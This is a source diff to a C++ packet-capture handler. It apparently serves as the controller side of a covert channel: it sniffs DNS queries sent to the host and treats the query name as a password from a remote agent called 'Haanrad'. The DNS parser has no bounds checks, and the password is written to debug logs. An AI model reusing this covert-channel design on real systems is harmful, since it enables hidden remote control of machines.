@@ -5,24 +5,29 @@
 #include <pcap.h>
 #include <iostream>
 #include <cstring>
+#include <netinet/udp.h>
+#include <dnet.h>
 #include "CommHandler.h"
 #include "MessageQueue.h"
 #include "../shared/Logger.h"
 #include "../shared/PacketIdentifier.h"
+#include "../shared/Structures.h"
+#include "../shared/Authenticator.h"
 
 CommHandler * CommHandler::instance = nullptr;
 
-CommHandler::CommHandler(MessageQueue * messageQueue) {
+CommHandler::CommHandler(MessageQueue * messageQueue, HCrypto * crypto) {
     this->messageQueue = messageQueue;
+    this->crypto = crypto;
 
     if(!getInterface()){
         Logger::debug(to_string(getpid()) + " CommHandler - There Was An Error Fetching The Interface For The Monitor");
     }
 }
 
-CommHandler* CommHandler::getInstance(MessageQueue * messageQueue) {
+CommHandler* CommHandler::getInstance(MessageQueue * messageQueue, HCrypto * crypto) {
     if(CommHandler::instance == nullptr){
-        CommHandler::instance = new CommHandler(messageQueue);
+        CommHandler::instance = new CommHandler(messageQueue, crypto);
     }
 
     return CommHandler::instance;
@@ -77,8 +82,67 @@ bool CommHandler::getInterface() {
     return false;
 }
 
-void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
+bool CommHandler::isValidAuth(PacketMeta meta) {
 
+    //parse out the ip destination address
+    struct iphdr * ip2 = (struct iphdr *)meta.packet;
+
+    in_addr_t da = (in_addr_t)ip2->daddr;
+    char destinationIP[INET_ADDRSTRLEN];
+    inet_ntop(AF_INET, &da, destinationIP, INET_ADDRSTRLEN);
+    string strDestinationIP(destinationIP);
+
+    //now check the destination address belongs to an address we know is assigned to one of our interfaces
+    bool destinationMatch = false;
+    for(pcap_if_t * interface = CommHandler::instance->allInterfaces; interface != NULL; interface=interface->next){
+
+        for(pcap_addr_t * address = interface->addresses; address != NULL; address=address->next){
+            if(address->addr->sa_family == AF_INET){
+
+                //if the packets destination address matches ones of these addresses, then we know it was sent to us
+                string interfaceIP(inet_ntoa(((struct sockaddr_in*)address->addr)->sin_addr));
+
+                if(interfaceIP.compare(strDestinationIP)==0){
+                    destinationMatch = true;
+                    break;
+                }
+
+            }
+        }
+
+        if(destinationMatch){
+            break;
+        }
+    }
+
+    //if there never is a match, we know its not for us - it might even be outbound
+    if(destinationMatch == false){
+        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is Not Destined For A Known Address. Can't Be From Haanrad");
+        return false;
+    }
+
+    //application type here is DNS. Need to confirm its a request destined for us
+    char * transportLayer = PacketIdentifier::findTransportLayer(&meta);
+    if(transportLayer == nullptr){
+        Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Could Not Find TransportLayer. Can't Use Packet To check For Password");
+        return false;
+    }
+
+    //transportLayer could be found
+    struct udphdr * udp = (struct udphdr *)transportLayer;
+    short destPort = ntohs(udp->dest);
+    Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Parsed Destination Port: " + to_string(destPort));
+
+    //confirm its for us and DNS using one of the typical DNS destination ports - Google likes to use 5353
+    if(destPort == 53 || destPort == 5353){
+        return true;
+    }
+
+    return false;
+}
+
+
+void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet) {
 
     char * BUFFER = (char *)(packet + 16);
     struct iphdr * ip = (struct iphdr *)BUFFER;
@@ -99,17 +163,70 @@ void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_
             return;
         }
 
-        //application type here is DNS
+        //check this is a valid auth call from Haanrad
+        if(CommHandler::instance->isValidAuth(meta)){
+            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Packet Is A DNS Request For Us. Assumed Haaanrad");
 
+            string password = CommHandler::instance->parseOutDNSQuery(meta);
+            Logger::debug(to_string(getpid()) + " CommHandler:packetCallback - Received Password From Haanrad: >" + password + "<");
 
+            //initialize all components for communicating with Haanrad
+            CommHandler::instance->password = password;
+            CommHandler::instance->haanradConnected = true;
+
+            Authenticator::setPassword(password);
+            CommHandler::instance->crypto->initialize(password);
+
+            CommHandler::instance->killListening();
+        }
 
     }
 
+}
 
+string CommHandler::parseOutDNSQuery(PacketMeta meta){
 
+    if(meta.applicationType != ApplicationType::DNS){
+        Logger::debug("Main:parseOutDNSQuery - FATAL ERROR. PacketMeta Is Not A DNS Packet");
+        return "";
+    }
 
+    char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
+    struct DNS_HEADER * dns = (struct DNS_HEADER * )applicationLayer;
 
+    char * query = applicationLayer + sizeof(struct DNS_HEADER);
+    char * ptr = query;
 
+    bool keepProcessing = true;
+    string queryName = "";
+    bool isFirst = true;
+    while(keepProcessing){
+
+        int len = (int)(*ptr);
+        //if this is the first one or the last one. don't put a dot
+        if(isFirst || len == 0){
+            isFirst = false;
+        }else{
+            queryName += ".";
+        }
+
+        if(len == 0){
+            break;
+        }else{
+
+            ptr++;
+            string segment = "";
+            for(int i = 0; i < len; ++i){
+                char c = (*ptr);
+                segment += c;
+                ptr++;
+            }
+
+            queryName += segment;
+        }
+
+    }
+    return queryName;
 }
 
 void CommHandler::listenForMessages() {
